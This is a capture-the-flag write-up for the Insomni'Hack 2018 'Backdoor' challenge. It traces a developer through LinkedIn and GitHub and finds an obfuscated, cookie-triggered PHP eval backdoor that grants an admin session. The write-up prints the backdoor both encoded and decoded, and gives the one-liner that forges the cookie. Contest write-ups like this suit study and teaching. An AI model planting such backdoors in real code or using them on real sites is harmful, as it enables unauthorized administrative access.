---
title: Insomni'Hack 2018 - Backdoor
layout: writeup
authors: Guillaume_Lopes
---
Solves: 25 / Points: 124


## Challenge description
The challenge is pretty simple. You need to find information about a specific developer in order to obtain access to a web application.



## Challenge resolution


When connecting to the webapp http://bd.insomniack.ch, we can found in the HTML code the name of the developer:

* James Karsmith

After some Googling, we finally found a Linkedin account from a web developer working in Geneve with the same name:
![James Linkedin Profile]({{ site.url }}/assets/james.png)

When looking on a GitHub, we can find only one user with the company name:

* https://github.com/WackyWebWizards

In the repository, we can see the developer created a backdoor in order to login as shown in the code below:
```php
<?php
if(isset($_COOKIE['wwwadmin'])) {
        $code="y0zTSK/KzEvLSSxJ1UhKLE41M4lPSU3OT0nVUIl39vf39nSNVi8vL09Myc3MU4/V1FSwtbVVUCo2Ti4yLolPSkzOTjEwKIovyY9PzMmJL0hMTy1WVNJUqObiVIkPdg0O9vT3i1bPTFGPVbBVMLRGEYUaCZGoBQA=";
        eval(gzinflate(base64_decode($code)));
}
?>
```

In order to retrieve the value of $code variable, we just modified `eval` function with `echo` and we obtained the following code:
```php
if(gzinflate(base64_decode($_COOKIE['wwwadmin'])) === "s3cr3t_backd00r_to_all_pages!") {
	$_SESSION['id'] = 1;
	$_SESSION['admin'] = 1;
}
```

So to sump up, in order to obtain admin access, we need to have a cookie name `wwwadmin` with the value "s3cr3t_backd00r_to_all_pages!" compressed with Gzip and encoded in base64.
It's just one line of PHP:
```php
echo base64_encode(gzdeflate("s3cr3t_backd00r_to_all_pages!"));
```

At the end we obtain the flag!!!

![Flag]({{ site.url }}/assets/backdoor-flag.png)
